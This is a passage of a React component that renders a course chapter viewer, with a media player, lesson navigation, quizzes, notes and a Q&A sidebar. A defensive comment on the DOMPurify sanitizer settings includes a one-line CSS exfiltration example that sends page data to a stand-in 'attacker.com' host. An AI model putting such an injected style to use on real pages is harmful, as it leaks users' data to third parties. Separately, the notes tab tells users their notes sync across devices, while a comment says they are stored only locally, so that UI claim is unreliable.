                  const ytMatch = url.match(/(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/)([a-zA-Z0-9_-]+)/);
                  if (ytMatch) return `https://www.youtube.com/embed/${ytMatch[1]}`;
                  return url;
                })()}
                className="w-full h-full"
                allow="autoplay; fullscreen; picture-in-picture"
                allowFullScreen
                frameBorder="0"
                title={chapter.title}
              />
            </div>
          ) : chapter.content_type === "pdf" && chapter.media_url ? (
            <div className="w-full rounded-[16px] border border-border overflow-hidden bg-card h-[55vh] sm:h-[80vh]">
              <iframe src={chapter.media_url} className="w-full h-full" title={`${chapter.title} — PDF`} />
            </div>
          ) : chapter.content_type === "image" && chapter.media_url ? (
            <div className="w-full rounded-[16px] border border-border overflow-hidden bg-card flex items-center justify-center p-4">
              <img src={chapter.media_url} alt={chapter.title} className="max-w-full max-h-[80vh] object-contain rounded-lg" />
            </div>
          ) : chapter.content_type === "embedded" && chapter.embed_url ? (
            <div className="aspect-video bg-card rounded-[16px] border border-border overflow-hidden">
              <iframe src={chapter.embed_url} className="w-full h-full" allow="autoplay; fullscreen" allowFullScreen frameBorder="0" title={chapter.title} />
            </div>
          ) : chapter.content_type === "article" || chapter.content_type === "text" ? (
            <div className="bg-card rounded-[16px] border border-border p-8 flex items-center gap-4">
              <div className="text-3xl">📄</div>
              <div>
                <p className="font-medium">{chapter.title}</p>
                <p className="text-muted-foreground text-sm mt-1">Scroll down to read the article content</p>
              </div>
            </div>
          ) : (
            <div className="aspect-video bg-card rounded-[16px] border border-border flex items-center justify-center">
              <div className="text-center">
                <div className="text-4xl mb-2">📚</div>
                <p className="text-muted-foreground text-sm">{chapter.title}</p>
                <p className="text-muted-foreground/60 text-xs mt-1">Content not available</p>
              </div>
            </div>
          )}

          {/* Chapter info - the Masterclass pattern: big title on the
              left with primary actions docked on the right. The title
              is the loudest element below the player; actions sit on
              the same baseline so the eye never has to drop twice. */}
          <div className="space-y-5">
            <div className="flex flex-col sm:flex-row sm:items-end sm:justify-between gap-4 sm:gap-6">
              <div className="space-y-2 flex-1 min-w-0">
                <p className="text-[11px] font-mono uppercase tracking-[0.22em] text-[hsl(var(--cream))]/70">
                  Lesson {currentIndex + 1} of {siblings.length}
                </p>
                <h1 className="text-2xl sm:text-4xl font-bold tracking-[-0.01em] leading-[1.1]">
                  {chapter.title}
                </h1>
              </div>
              <div className="flex items-center gap-2 shrink-0">
                <Button
                  variant="outline"
                  size="sm"
                  onClick={handleShare}
                  className="h-11 min-w-[44px]"
                >
                  <Share2 className="h-4 w-4 sm:mr-2" />
                  <span className="hidden sm:inline">Share</span>
                </Button>
                {!isCompleted ? (
                  <Button
                    onClick={handleMarkComplete}
                    disabled={submitting}
                    size="sm"
                    className="h-11 px-4 font-semibold bg-[hsl(var(--cream))] text-[hsl(var(--cream-text))] hover:opacity-90 hover:-translate-y-0.5 transition-all"
                  >
                    <CheckCircle2 className="h-4 w-4 mr-2" />
                    Mark complete
                  </Button>
                ) : (
                  <span className="flex items-center gap-1.5 text-xs text-[hsl(var(--accent-emerald))] font-medium px-2 h-11">
                    <CheckCircle2 className="h-4 w-4" /> Completed
                  </span>
                )}
              </div>
            </div>
            {chapter.description && (
              <p className="text-muted-foreground text-base leading-relaxed max-w-[68ch]">
                {chapter.description}
              </p>
            )}
          </div>

          {/* Nav buttons */}
          <div className="flex items-center justify-between pt-5 border-t border-border">
            <Button
              variant="outline"
              size="sm"
              disabled={currentIndex <= 0}
              onClick={() => navigate(`/chapters/${siblings[currentIndex - 1]?.id}`)}
              className="h-11 min-w-[44px]"
            >
              <ChevronLeft className="h-4 w-4 mr-1" /> Previous
            </Button>
            {/* Compact progress dots - shows location at a glance without
                taking the cognitive load of "12 / 15". Caps at 30 dots so
                very long courses don't blow out the row; falls back to
                a numeric counter past that. */}
            {siblings.length <= 30 ? (
              <div className="flex items-center gap-1.5">
                {siblings.map((_, i) => (
                  <span
                    key={i}
                    className={`h-1.5 rounded-full transition-all ${
                      i === currentIndex
                        ? "w-6 bg-[hsl(var(--cream))]"
                        : i < currentIndex
                        ? "w-1.5 bg-foreground/40"
                        : "w-1.5 bg-foreground/15"
                    }`}
                  />
                ))}
              </div>
            ) : (
              <span className="text-xs text-muted-foreground font-mono">
                {currentIndex + 1} / {siblings.length}
              </span>
            )}
            <Button
              variant="outline"
              size="sm"
              disabled={currentIndex >= siblings.length - 1}
              onClick={() => navigate(`/chapters/${siblings[currentIndex + 1]?.id}`)}
              className="h-11 min-w-[44px]"
            >
              Next <ChevronRight className="h-4 w-4 ml-1" />
            </Button>
          </div>

          {/* Quizzes */}
          {quizzes.length > 0 && (
            <div className="space-y-6 mt-8">
              <h3 className="text-lg font-semibold text-foreground">Knowledge Check</h3>
              {quizzes.map((quiz) => (
                <QuizBlock key={quiz.id} quiz={quiz} userId={user?.id} />
              ))}
            </div>
          )}
        </div>

        {/* Right sidebar - grows proportionally on wider viewports so
            it doesn't feel cramped next to a giant 2K+ player. */}
        <div className="lg:w-[380px] xl:w-[420px] 2xl:w-[480px] shrink-0 border-t lg:border-t-0 lg:border-l border-border p-4 lg:p-6">
          {/* Sidebar header — course context above the tabs, matching the
              Masterclass watching pattern where the course identity is
              always visible above the lesson navigator. */}
          {courseTitle && (
            <div className="flex items-center gap-3 pb-4 mb-4 border-b border-border">
              <div className="h-9 w-9 rounded-full bg-[hsl(var(--cream))]/15 flex items-center justify-center shrink-0">
                <ListVideo className="h-4 w-4 text-[hsl(var(--cream))]" />
              </div>
              <div className="min-w-0 flex-1">
                <p className="text-[10px] font-mono uppercase tracking-[0.22em] text-muted-foreground">
                  You're in
                </p>
                <p className="text-sm font-semibold truncate">{courseTitle}</p>
              </div>
              <span className="text-xs text-muted-foreground font-mono shrink-0">
                {currentIndex + 1}/{siblings.length}
              </span>
            </div>
          )}
          <Tabs defaultValue="upnext" className="w-full">
            <TabsList className="w-full grid grid-cols-5 h-11">
              <TabsTrigger value="upnext" className="text-xs gap-1 px-1">
                <Play className="h-3.5 w-3.5" />
                <span className="hidden md:inline">Up Next</span>
              </TabsTrigger>
              <TabsTrigger value="notes" className="text-xs gap-1 px-1">
                <PenLine className="h-3.5 w-3.5" />
                <span className="hidden md:inline">Notes</span>
              </TabsTrigger>
              <TabsTrigger value="overview" className="text-xs gap-1 px-1">
                <Info className="h-3.5 w-3.5" />
                <span className="hidden md:inline">Overview</span>
              </TabsTrigger>
              <TabsTrigger value="resources" className="text-xs gap-1 px-1">
                <FileText className="h-3.5 w-3.5" />
                <span className="hidden md:inline">Files</span>
              </TabsTrigger>
              <TabsTrigger value="qna" className="text-xs gap-1 px-1 relative">
                <HelpCircle className="h-3.5 w-3.5" />
                <span className="hidden md:inline">Q&amp;A</span>
                {qna.some((q) => q.replies.some((r) => r.is_instructor_reply) && q.user_id === user?.id && !q.is_resolved) && (
                  <span className="absolute top-1.5 right-1.5 h-1.5 w-1.5 rounded-full bg-[hsl(var(--accent-emerald))] animate-pulse" />
                )}
              </TabsTrigger>
            </TabsList>

            {/* Up Next - chapter navigator. Each tile shows lesson
                number badge, 16:9 thumbnail (or a numbered fallback when
                no thumbnail is set), title, and a description excerpt -
                Rahul's request: "lesson number, thumbnail, and description
                for sure" since that's what pulls the learner into the
                next lesson. The current lesson gets a cream tint + ring
                so it's anchored. */}
            <TabsContent value="upnext" className="mt-4 space-y-2">
              {siblings.length === 0 ? (
                <p className="text-sm text-muted-foreground/60">No other lessons in this course.</p>
              ) : (
                <>
                  {(() => {
                    const start = currentIndex;
                    const visible = siblings.slice(start, start + 6);
                    return visible.map((s, idx) => {
                      const absIndex = start + idx;
                      const isCurrent = s.id === chapter.id;
                      const mins = s.duration_seconds ? Math.max(1, Math.round(s.duration_seconds / 60)) : null;
                      return (
                        <button
                          key={s.id}
                          onClick={() => !isCurrent && navigate(`/chapters/${s.id}`)}
                          disabled={isCurrent}
                          className={`w-full flex gap-3 p-2.5 rounded-lg text-left transition-colors min-h-[68px] ${
                            isCurrent
                              ? "bg-[hsl(var(--cream))]/10 ring-1 ring-[hsl(var(--cream))]/40 cursor-default"
                              : "hover:bg-surface/60 active:bg-surface"
                          }`}
                        >
                          {/* Thumbnail with overlaid lesson number badge.
                              Resolution order matches the admin contract:
                                1. Custom thumbnail_url (creator override)
                                2. vdocipher_thumbnail_url (auto-fetched poster)
                                3. Numbered tile fallback
                              Only the last branch shows a big centered number;
                              the others get a small black chip in the top-left. */}
                          {(() => {
                            const thumb = s.thumbnail_url || s.vdocipher_thumbnail_url || null;
                            return (
                              <div className="relative w-[88px] sm:w-[104px] aspect-video rounded-md overflow-hidden shrink-0 bg-surface-2">
                                {thumb && (
                                  <img
                                    src={thumb}
                                    alt=""
                                    className="w-full h-full object-cover"
                                    loading="lazy"
                                    decoding="async"
                                  />
                                )}
                                {thumb && !isCurrent && (
                                  <span className="absolute top-1 left-1 px-1.5 py-0.5 rounded bg-black/70 text-[10px] font-mono text-white">
                                    {absIndex + 1}
                                  </span>
                                )}
                                {!thumb && !isCurrent && (
                                  <div className="absolute inset-0 flex items-center justify-center font-mono text-base font-semibold text-muted-foreground/50">
                                    {absIndex + 1}
                                  </div>
                                )}
                                {isCurrent && (
                                  <span className="absolute inset-0 bg-[hsl(var(--cream))]/15 flex items-center justify-center">
                                    <Play className="h-4 w-4 fill-[hsl(var(--cream))] text-[hsl(var(--cream))]" />
                                  </span>
                                )}
                              </div>
                            );
                          })()}
                          <div className="flex-1 min-w-0 flex flex-col justify-center">
                            <p className={`text-sm leading-tight line-clamp-2 ${isCurrent ? "font-semibold" : ""}`}>
                              {s.title}
                            </p>
                            {s.description && (
                              <p className="text-[11px] text-muted-foreground line-clamp-2 mt-1 leading-snug">
                                {s.description}
                              </p>
                            )}
                            {mins && (
                              <p className="text-[10px] text-muted-foreground/70 mt-1 font-mono">
                                {mins} min
                              </p>
                            )}
                          </div>
                        </button>
                      );
                    });
                  })()}
                  {courseId && siblings.length > 6 && (
                    <Link
                      to={`/courses/${courseId}`}
                      className="block w-full text-center text-xs text-muted-foreground hover:text-foreground transition-colors py-2 mt-1"
                    >
                      View all {siblings.length} lessons
                    </Link>
                  )}
                </>
              )}
            </TabsContent>

            {/* Notes - localStorage-backed per-chapter scratchpad. v1 is
                local-only so it doesn't sync across devices; a future
                pass can promote this to a chapter_notes DB table. */}
            <TabsContent value="notes" className="mt-4 space-y-2">
              <div className="flex items-center justify-between">
                <p className="text-xs text-muted-foreground">
                  Your private notes for this lesson.
                </p>
                {notesSavedAt && (
                  <span className="text-[10px] font-mono text-[hsl(var(--accent-emerald))]/80 uppercase tracking-wider">
                    Saved
                  </span>
                )}
              </div>
              <Textarea
                placeholder="Jot down what stood out…"
                value={notes}
                onChange={(e) => setNotes(e.target.value)}
                rows={10}
                className="text-sm resize-none"
              />
              <p className="text-[10px] text-muted-foreground/60">
                Syncs to your account &mdash; you'll see these notes on any device you sign in on.
              </p>
            </TabsContent>

            {/* Overview */}
            <TabsContent value="overview" className="mt-4 space-y-4">
              {chapter.description ? (
                <p className="text-sm text-muted-foreground leading-relaxed">
                  {chapter.description}
                </p>
              ) : (
                <p className="text-sm text-muted-foreground/60">No description for this chapter.</p>
              )}
              {chapter.article_body && (
                <div className="prose prose-invert prose-sm max-w-none">
                  {/*
                    DOMPurify config notes:
                    - `style` is intentionally NOT in ALLOWED_ATTR. Inline styles
                      permit CSS-based exfiltration (e.g. `background-image:
                      url('attacker.com/pixel?data=...')`) and can be used to
                      spoof UI chrome. Presentation stays in CSS classes.
                    - `FORCE_BODY` prevents DOMPurify from upgrading fragments
                      to full documents.
                    - `ALLOWED_URI_REGEXP` restricts anchor/img URLs to http(s)
                      and mailto, blocking `javascript:`, `data:`, and other
                      schemes that can bypass the tag filter.
                  */}
                  <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(chapter.article_body, {
                    ALLOWED_TAGS: ['p','br','strong','b','em','i','u','h1','h2','h3','h4','h5','h6','ul','ol','li','a','code','pre','blockquote','img','table','thead','tbody','tr','th','td','hr','span','div','figure','figcaption','sup','sub'],
                    ALLOWED_ATTR: ['href','target','rel','src','alt','width','height','class','id'],
                    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
                    FORCE_BODY: true,
                  }) }} />
                </div>
              )}
            </TabsContent>

            {/* Resources */}
            <TabsContent value="resources" className="mt-4 space-y-2">
              {resources.length === 0 ? (
                <p className="text-sm text-muted-foreground/60">No downloadable files for this chapter.</p>
              ) : (
                resources.map((r) => (
                  <a
                    key={r.id}
                    href={r.file_url}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="flex items-center gap-3 p-3 rounded-lg bg-surface hover:bg-accent/30 transition-colors text-sm"
                  >
                    <Download className="h-4 w-4 text-muted-foreground shrink-0" />
                    <span className="flex-1 truncate">{r.filename}</span>
                    {r.file_size_bytes && (
                      <span className="text-xs text-muted-foreground">
                        {(r.file_size_bytes / 1024).toFixed(0)}KB
                      </span>
                    )}
                  </a>
                ))
              )}
            </TabsContent>

            {/* Q&A — threaded discussion per chapter. Visually upgraded
                to match the cinematic UX of the rest of the watching
                page: editorial eyebrow, instructor-reply visual tagging,
                cleaner empty state. */}
            <TabsContent value="qna" className="mt-4 space-y-5">
              <div className="space-y-2">
                <div className="flex items-baseline justify-between">
                  <p className="text-[10px] font-mono uppercase tracking-[0.22em] text-[hsl(var(--cream))]/70">
                    Ask the instructor
                  </p>
                  {qna.length > 0 && (
                    <p className="text-[10px] font-mono uppercase tracking-wider text-muted-foreground">
                      {qna.length} question{qna.length === 1 ? "" : "s"}
                    </p>
                  )}
                </div>
                <Textarea
                  placeholder="What's on your mind about this lesson?"
                  value={questionText}
                  onChange={(e) => setQuestionText(e.target.value)}
                  rows={3}
                  className="text-sm resize-none bg-[hsl(var(--surface))]"
                />
                <div className="flex items-center justify-end">
                  <Button
                    size="sm"
                    onClick={handlePostQuestion}
                    disabled={!questionText.trim() || submitting}
                    className="bg-[hsl(var(--cream))] text-[hsl(var(--cream-text))] hover:opacity-90 font-medium"
                  >
                    {submitting ? "Posting…" : "Post question"}
                  </Button>
                </div>
              </div>
              <div className="space-y-3">
                {qna.length === 0 ? (
                  <div className="rounded-xl border border-dashed border-border bg-[hsl(var(--surface))]/40 p-6 text-center">
                    <p className="text-sm text-foreground/80 font-medium">Nothing yet — be the first.</p>
                    <p className="text-xs text-muted-foreground mt-1 max-w-[34ch] mx-auto">
                      Stuck on a technique? Want a deeper breakdown? The instructor and your fellow students can answer.
                    </p>
                  </div>
                ) : (
                  qna.slice(0, qnaLimit).map((q) => {
                    const hasInstructorReply = q.replies.some((r) => r.is_instructor_reply);
                    const initial = (q.user_name || "?").slice(0, 1).toUpperCase();
                    return (
                      <div
                        key={q.id}
                        className="rounded-xl border border-border bg-[hsl(var(--surface))] p-4 space-y-3"
                      >
                        <div className="flex items-start gap-3">
                          <div className="h-7 w-7 rounded-full bg-surface-2 flex items-center justify-center text-[11px] font-mono font-semibold text-muted-foreground shrink-0">
                            {initial}
                          </div>
                          <div className="flex-1 min-w-0 space-y-1">
                            <div className="flex items-center gap-2 flex-wrap">
                              <span className="text-sm font-semibold">{q.user_name || "Student"}</span>
                              <span className="text-[10px] font-mono text-muted-foreground">
                                {new Date(q.created_at).toLocaleDateString("en-IN", { day: "2-digit", month: "short" })}
                              </span>
                              {q.is_resolved && (
                                <span className="px-1.5 py-0.5 rounded text-[10px] font-mono uppercase tracking-wider bg-[hsl(var(--accent-emerald)/0.15)] text-[hsl(var(--accent-emerald))] border border-[hsl(var(--accent-emerald)/0.3)]">
                                  Resolved
                                </span>
                              )}
                              {!q.is_resolved && hasInstructorReply && (
                                <span className="px-1.5 py-0.5 rounded text-[10px] font-mono uppercase tracking-wider bg-[hsl(var(--cream)/0.15)] text-[hsl(var(--cream))] border border-[hsl(var(--cream)/0.3)]">
                                  Answered
                                </span>
                              )}
                            </div>
                            <p className="text-sm text-foreground leading-relaxed whitespace-pre-wrap">
                              {q.question_text}
                            </p>
                          </div>
                        </div>
                        {q.replies.length > 0 && (
                          <div className="ml-10 space-y-2 pl-3 border-l border-border">
                            {q.replies.map((r) => (
                              <div
                                key={r.id}
                                className={`rounded-md p-2.5 ${
                                  r.is_instructor_reply
                                    ? "bg-[hsl(var(--cream)/0.08)] border border-[hsl(var(--cream)/0.2)]"
                                    : "bg-surface-2"
                                }`}
                              >
                                <div className="flex items-center gap-2 mb-1">
                                  <span className="text-xs font-semibold">
                                    {r.is_instructor_reply ? "Instructor" : (r.user_name || "Student")}
                                  </span>
                                  {r.is_instructor_reply && (
                                    <span className="px-1.5 py-0.5 rounded text-[9px] font-mono uppercase tracking-wider bg-[hsl(var(--cream))] text-[hsl(var(--cream-text))]">
                                      Staff
                                    </span>
                                  )}
                                  <span className="text-[10px] font-mono text-muted-foreground/70">
                                    {new Date(r.created_at).toLocaleDateString("en-IN", { day: "2-digit", month: "short" })}
                                  </span>
                                </div>
                                <p className="text-sm leading-relaxed whitespace-pre-wrap">{r.reply_text}</p>
                              </div>
                            ))}
                          </div>
                        )}
                      </div>
                    );
                  })
                )}
                {qna.length > qnaLimit && (
                  <Button
                    variant="outline"
                    size="sm"
                    className="w-full"
                    onClick={() => setQnaLimit((prev) => prev + 20)}
                  >
                    Show {qna.length - qnaLimit} more question{qna.length - qnaLimit === 1 ? "" : "s"}
                  </Button>
                )}
              </div>
            </TabsContent>

          </Tabs>
        </div>
      </div>
    </div>
  );
};

export default ChapterViewer;
